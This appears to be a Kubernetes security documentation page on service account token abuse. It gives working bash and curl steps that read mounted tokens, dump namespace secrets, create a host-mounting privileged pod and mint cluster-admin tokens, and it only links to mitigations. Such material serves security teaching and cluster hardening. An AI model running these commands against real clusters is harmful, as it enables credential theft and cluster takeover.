---
sidebar_position: 19
title: "Service Account Token Projection Abuse"
description: "Attack scenario demonstrating exploitation of service account tokens with excessive permissions or long lifetimes."
keywords: [kubernetes security, service account token, token abuse, privilege escalation, RBAC bypass, API server access, service account security, token projection, kubernetes authentication, JWT token]
---

# Service Account Token Projection Abuse

Kubernetes **service account tokens** provide pods with authentication credentials to access the API server. In versions prior to 1.21, these tokens were non-expiring and mounted into every pod by default. Even with modern token projection, misconfigured tokens with excessive permissions or long lifetimes present significant security risks.

This attack demonstrates how compromised pods or containers can abuse service account tokens to escalate privileges, access secrets, and move laterally within the cluster.

---

## Exploitation Steps

Attackers exploit service account tokens that are automatically mounted into pods to gain unauthorized cluster access.

### 1. Locate Mounted Service Account Token

Every pod with `automountServiceAccountToken: true` (default) has a token mounted.

```bash
# Inside a compromised container
ls -la /var/run/secrets/kubernetes.io/serviceaccount/

# View token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# View namespace
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
```

### 2. Test Token Permissions

Query the API server to discover what permissions the service account has.

```bash
# Set up environment variables
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

# Test basic API access
curl --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/$NAMESPACE

# Check self-permissions
curl --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
  -X POST \
  -d '{
    "apiVersion": "authorization.k8s.io/v1",
    "kind": "SelfSubjectAccessReview",
    "spec": {
      "resourceAttributes": {
        "namespace": "'$NAMESPACE'",
        "verb": "list",
        "resource": "secrets"
      }
    }
  }'
```

### 3. Extract Secrets Using Service Account Token

If the service account has secrets access, extract all secrets in the namespace.

```bash
# List all secrets
curl --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/$NAMESPACE/secrets

# Get specific secret (database credentials)
curl --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/$NAMESPACE/secrets/database-credentials \
  | jq -r '.data | map_values(@base64d)'
```

**Output:**

```json
{
  "username": "admin",
  "password": "SuperSecret123!",
  "host": "postgres.production.svc.cluster.local"
}
```

### 4. Create Privileged Pods for Container Escape

If the service account can create pods, spawn a privileged container for host access.

```bash
# Create privileged pod manifest
cat <<EOF | curl --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  $APISERVER/api/v1/namespaces/$NAMESPACE/pods \
  -X POST -d @-
{
  "apiVersion": "v1",
  "kind": "Pod",
  "metadata": {
    "name": "breakout-pod"
  },
  "spec": {
    "hostNetwork": true,
    "hostPID": true,
    "hostIPC": true,
    "containers": [{
      "name": "breakout",
      "image": "alpine:latest",
      "command": ["sh", "-c", "sleep 3600"],
      "securityContext": {
        "privileged": true
      },
      "volumeMounts": [{
        "name": "host",
        "mountPath": "/host"
      }]
    }],
    "volumes": [{
      "name": "host",
      "hostPath": {
        "path": "/"
      }
    }]
  }
}
EOF
```

### 5. Escalate to Cluster Admin via TokenRequest API

If the service account has `serviceaccounts/token` create permissions, generate tokens for other service accounts.

```bash
# Create token for cluster-admin service account
curl --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  $APISERVER/api/v1/namespaces/kube-system/serviceaccounts/cluster-admin/token \
  -X POST -d '{
    "apiVersion": "authentication.k8s.io/v1",
    "kind": "TokenRequest",
    "spec": {
      "expirationSeconds": 3600
    }
  }' | jq -r '.status.token'

# Use the new token
ADMIN_TOKEN="<token-from-above>"

# Now has cluster-admin privileges
curl --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  $APISERVER/api/v1/nodes
```

### 6. Persist Access with Legacy Token Secrets

In clusters with pre-1.24 service accounts, extract non-expiring tokens.

```bash
# List service account secrets
curl --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/$NAMESPACE/secrets \
  | jq '.items[] | select(.type=="kubernetes.io/service-account-token")'

# Extract legacy token (never expires)
curl --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/$NAMESPACE/secrets/default-token-xxxxx \
  | jq -r '.data.token' | base64 -d
```

### Result

The attacker now has:

- **Persistent API access** through stolen service account tokens
- **Access to secrets** including database credentials and API keys
- **Ability to create privileged pods** for container escape
- **Cluster-admin privileges** via token request API abuse
- **Long-lived tokens** in clusters using legacy token secrets
- **Lateral movement** to other namespaces and resources

---

## Mitigation

See the mitigation strategies in:

[Service Account Token Security](/docs/best_practices/cluster_setup_and_hardening/rbac_and_identity/service_account_token_security)
